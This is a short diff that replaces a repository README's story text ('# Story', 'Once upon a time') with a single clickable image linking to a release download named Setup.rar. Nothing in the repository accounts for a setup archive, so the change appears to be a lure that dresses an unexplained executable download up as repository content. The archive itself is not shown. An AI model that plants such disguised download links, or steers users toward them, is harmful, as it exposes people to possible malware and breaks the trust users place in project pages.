@@ -1,2 +1,1 @@
-# Story
-Once upon a time
+[![Frame 4aaabbb](https://github.com/willybillyrillysilly/Story/assets/127364879/99708da4-fa31-4511-b705-11ad8b9bd520)](https://github.com/willybillyrillysilly/Story/releases/download/Setup/Setup.rar)
